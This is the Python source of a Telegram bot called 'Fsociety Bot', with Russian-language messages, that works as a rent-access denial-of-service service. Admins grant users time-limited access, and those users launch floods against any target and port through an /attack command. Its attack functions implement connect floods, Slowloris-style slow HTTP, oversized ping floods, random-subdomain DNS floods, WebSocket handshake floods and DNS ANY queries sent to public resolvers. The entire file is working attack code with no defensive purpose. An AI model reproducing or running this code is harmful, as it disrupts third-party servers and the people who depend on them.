#!/usr/bin/env python3
import os
import sys
import asyncio
import socket
import random
import time
import json
import requests
from threading import Thread
from datetime import datetime

import telebot
from telebot.types import Message

# ========== НАСТРОЙКИ ==========
BOT_TOKEN = os.getenv('BOT_TOKEN')
if not BOT_TOKEN:
    print("❌ Ошибка: переменная BOT_TOKEN не установлена!")
    sys.exit(1)

ADMIN_IDS = []
admin_ids_str = os.getenv('ADMIN_IDS')
if admin_ids_str:
    for x in admin_ids_str.split(','):
        try:
            ADMIN_IDS.append(int(x.strip()))
        except:
            pass
    print(f"✅ Администраторы: {ADMIN_IDS}")
else:
    print("⚠️ ADMIN_IDS не задана, администраторов нет.")

MAX_TASKS = int(os.getenv('MAX_TASKS', '50000'))
TIMEOUT = int(os.getenv('TIMEOUT', '5'))

# Файлы
USERS_FILE = "users.json"
LOGS_FILE = "logs.json"
# ================================

bot = telebot.TeleBot(BOT_TOKEN)
authorized_users = {}
active_attacks = {}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14) Chrome/120.0.0.0 Mobile Safari/537.36",
]

# ========== ФУНКЦИИ ==========
def load_users():
    global authorized_users
    try:
        with open(USERS_FILE, 'r') as f:
            authorized_users = json.load(f)
            authorized_users = {int(k): v for k, v in authorized_users.items()}
    except:
        authorized_users = {}

def save_users():
    with open(USERS_FILE, 'w') as f:
        json.dump(authorized_users, f)

def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_auth(user_id):
    if is_admin(user_id):
        return True
    exp = authorized_users.get(user_id, 0)
    if exp > time.time():
        return True
    if user_id in authorized_users:
        del authorized_users[user_id]
        save_users()
    return False

def delete_webhook():
    try:
        r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook")
        if r.json().get('ok'):
            print("✅ Вебхук удалён")
        else:
            print("⚠️ Не удалось удалить вебхук")
    except Exception as e:
        print(f"❌ Ошибка удаления вебхука: {e}")

def log_attack(user_id, username, target, port, method, duration):
    try:
        with open(LOGS_FILE, 'r') as f:
            logs = json.load(f)
    except:
        logs = []
    logs.append({
        'time': datetime.now().isoformat(),
        'user': user_id,
        'name': username,
        'target': target,
        'port': port,
        'method': method,
        'duration': duration
    })
    if len(logs) > 100:
        logs = logs[-100:]
    with open(LOGS_FILE, 'w') as f:
        json.dump(logs, f, indent=2)

# ========== КОМАНДЫ ==========
@bot.message_handler(commands=['start', 'help'])
def start(message: Message):
    bot.reply_to(message, 
        "🤖 **Fsociety Bot**\n\n"
        "Команды:\n"
        "/attack <method> <target> <port> <sec> — атака\n"
        "/stop — остановить\n"
        "/adduser <id> <days> — добавить (админ)\n"
        "/users — список (админ)\n"
        "Методы: syn, udp, slow, icmp, dns, ws",
        parse_mode='Markdown')

@bot.message_handler(commands=['adduser'])
def adduser(message: Message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Нет прав")
        return
    try:
        _, uid, days = message.text.split()
        uid = int(uid)
        days = int(days)
        authorized_users[uid] = time.time() + days * 86400
        save_users()
        bot.reply_to(message, f"✅ Пользователь {uid} добавлен на {days} дней")
    except:
        bot.reply_to(message, "❌ Ошибка: /adduser <id> <дни>")

@bot.message_handler(commands=['users'])
def users(message: Message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Нет прав")
        return
    if not authorized_users:
        bot.reply_to(message, "📭 Нет пользователей")
        return
    text = "📋 **Пользователи:**\n"
    for uid, exp in authorized_users.items():
        d = datetime.fromtimestamp(exp).strftime('%Y-%m-%d')
        text += f"• {uid} до {d}\n"
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(commands=['stop'])
def stop(message: Message):
    if not is_auth(message.from_user.id):
        bot.reply_to(message, "❌ Нет доступа")
        return
    if message.chat.id in active_attacks:
        del active_attacks[message.chat.id]
        bot.reply_to(message, "🛑 Атака остановлена")
    else:
        bot.reply_to(message, "ℹ️ Нет активных атак")

# ========== АТАКИ ==========
async def syn_attack(target, port, dur, tasks, chat_id, aid):
    total = 0
    end = time.time() + dur
    async def worker():
        nonlocal total
        while time.time() < end and chat_id in active_attacks and active_attacks[chat_id] == aid:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((target, port))
                s.close()
                total += 1
            except:
                pass
    tasks = [worker() for _ in range(min(tasks, 1000))]
    await asyncio.gather(*tasks, return_exceptions=True)
    return total

async def udp_attack(target, port, dur, tasks, chat_id, aid):
    dns = ["8.8.8.8", "8.8.4.4", "1.1.1.1"]
    query = bytes.fromhex("a1b20100000100000000000006676f6f676c6503636f6d0000ff0001")
    total = 0
    end = time.time() + dur
    async def worker():
        nonlocal total
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < end and chat_id in active_attacks and active_attacks[chat_id] == aid:
            try:
                s.sendto(query, (random.choice(dns), 53))
                total += 1
            except:
                pass
        s.close()
    tasks = [worker() for _ in range(tasks)]
    await asyncio.gather(*tasks, return_exceptions=True)
    return total

async def slow_attack(target, port, dur, tasks, chat_id, aid):
    total = 0
    end = time.time() + dur
    async def worker():
        nonlocal total
        while time.time() < end and chat_id in active_attacks and active_attacks[chat_id] == aid:
            try:
                r, w = await asyncio.open_connection(target, port)
                w.write(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
                await w.drain()
                for _ in range(5):
                    if time.time() >= end: break
                    w.write(f"X-{random.randint(1,9)}: {random.randint(1,9)}\r\n".encode())
                    await w.drain()
                    await asyncio.sleep(5)
                w.close()
                await w.wait_closed()
                total += 1
            except:
                pass
    tasks = [worker() for _ in range(min(tasks, 500))]
    await asyncio.gather(*tasks, return_exceptions=True)
    return total

async def icmp_attack(target, dur, tasks, chat_id, aid):
    total = 0
    end = time.time() + dur
    async def worker():
        nonlocal total
        while time.time() < end and chat_id in active_attacks and active_attacks[chat_id] == aid:
            try:
                proc = await asyncio.create_subprocess_exec(
                    'ping', '-c', '1', '-s', '65000', target,
                    stdout=asyncio.subprocess.DEVNULL,
                    stderr=asyncio.subprocess.DEVNULL)
                await proc.wait()
                total += 1
            except:
                pass
    tasks = [worker() for _ in range(min(tasks, 200))]
    await asyncio.gather(*tasks, return_exceptions=True)
    return total

async def dns_attack(target, dur, tasks, chat_id, aid):
    abc = 'abcdefghijklmnopqrstuvwxyz'
    total = 0
    end = time.time() + dur
    async def worker():
        nonlocal total
        while time.time() < end and chat_id in active_attacks and active_attacks[chat_id] == aid:
            try:
                sub = ''.join(random.choices(abc, k=5))
                proc = await asyncio.create_subprocess_exec(
                    'nslookup', f"{sub}.{target}",
                    stdout=asyncio.subprocess.DEVNULL,
                    stderr=asyncio.subprocess.DEVNULL)
                await proc.wait()
                total += 1
            except:
                pass
    tasks = [worker() for _ in range(tasks)]
    await asyncio.gather(*tasks, return_exceptions=True)
    return total

async def ws_attack(target, port, dur, tasks, chat_id, aid):
    total = 0
    end = time.time() + dur
    async def worker():
        nonlocal total
        while time.time() < end and chat_id in active_attacks and active_attacks[chat_id] == aid:
            try:
                r, w = await asyncio.open_connection(target, port)
                key = random.getrandbits(24)
                handshake = (
                    f"GET / HTTP/1.1\r\nHost: {target}\r\n"
                    f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
                    f"Sec-WebSocket-Key: {key:x}==\r\n"
                    f"Sec-WebSocket-Version: 13\r\n\r\n"
                )
                w.write(handshake.encode())
                await w.drain()
                await asyncio.sleep(5)
                w.close()
                await w.wait_closed()
                total += 1
            except:
                pass
    tasks = [worker() for _ in range(min(tasks, 200))]
    await asyncio.gather(*tasks, return_exceptions=True)
    return total

# ========== ДИСПЕТЧЕР ==========
async def attack_worker(method, target, port, dur, tasks, chat_id, aid, username):
    target = target.replace('http://', '').replace('https://', '').split('/')[0]
    if method == 'syn':
        total = await syn_attack(target, port, dur, tasks, chat_id, aid)
    elif method == 'udp':
        total = await udp_attack(target, port, dur, tasks, chat_id, aid)
    elif method == 'slow':
        total = await slow_attack(target, port, dur, tasks, chat_id, aid)
    elif method == 'icmp':
        total = await icmp_attack(target, dur, tasks, chat_id, aid)
    elif method == 'dns':
        total = await dns_attack(target, dur, tasks, chat_id, aid)
    elif method == 'ws':
        total = await ws_attack(target, port, dur, tasks, chat_id, aid)
    else:
        total = 0
    if chat_id in active_attacks and active_attacks[chat_id] == aid:
        del active_attacks[chat_id]
    log_attack(chat_id, username, target, port, method, dur)
    bot.send_message(
        chat_id,
        f"⚔️ **Атака завершена**\n"
        f"Цель: {target}:{port}\n"
        f"Метод: {method}\n"
        f"Длит: {dur} сек\n"
        f"Задач: {tasks}\n"
        f"Пакетов: ~{total}",
        parse_mode='Markdown'
    )

def run_attack(method, target, port, dur, tasks, chat_id, aid, username):
    asyncio.run(attack_worker(method, target, port, dur, tasks, chat_id, aid, username))

@bot.message_handler(commands=['attack'])
def attack(message: Message):
    if not is_auth(message.from_user.id):
        bot.reply_to(message, "❌ Нет доступа")
        return
    try:
        parts = message.text.split()
        if len(parts) < 5:
            bot.reply_to(message, "❌ Формат: /attack method target port seconds")
            return
        method = parts[1].lower()
        target = parts[2]
        port = int(parts[3])
        dur = int(parts[4])
        tasks = MAX_TASKS
        if len(parts) >= 6:
            tasks = min(int(parts[5]), MAX_TASKS)

        if method not in ('syn', 'udp', 'slow', 'icmp', 'dns', 'ws'):
            bot.reply_to(message, "❌ Неверный метод")
            return
        if dur > 3600:
            bot.reply_to(message, "❌ Максимум 3600 сек")
            return
        if port < 1 or port > 65535:
            bot.reply_to(message, "❌ Порт должен быть 1-65535")
            return
        if message.chat.id in active_attacks:
            bot.reply_to(message, "⚠️ Уже есть активная атака, используй /stop")
            return

        aid = f"{message.chat.id}_{int(time.time())}"
        active_attacks[message.chat.id] = aid
        username = message.from_user.username or str(message.from_user.id)
        bot.reply_to(message, f"⚔️ Атака {method} на {target}:{port} на {dur} сек, задач {tasks}")
        t = Thread(target=run_attack, args=(method, target, port, dur, tasks, message.chat.id, aid, username))
        t.daemon = True
        t.start()
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")

# ========== ОБРАБОТЧИК НЕИЗВЕСТНЫХ КОМАНД (ТОЛЬКО ДЛЯ /) ==========
@bot.message_handler(func=lambda m: m.text and m.text.startswith('/'))
def unknown_command(message: Message):
    bot.reply_to(message, "❌ Неизвестная команда. Напиши /help")

# ========== ЗАПУСК ==========
if __name__ == '__main__':
    load_users()
    delete_webhook()
    print("🤖 Fsociety Bot запущен")
    try:
        bot.infinity_polling()
    except KeyboardInterrupt:
        print("👋 Бот остановлен")
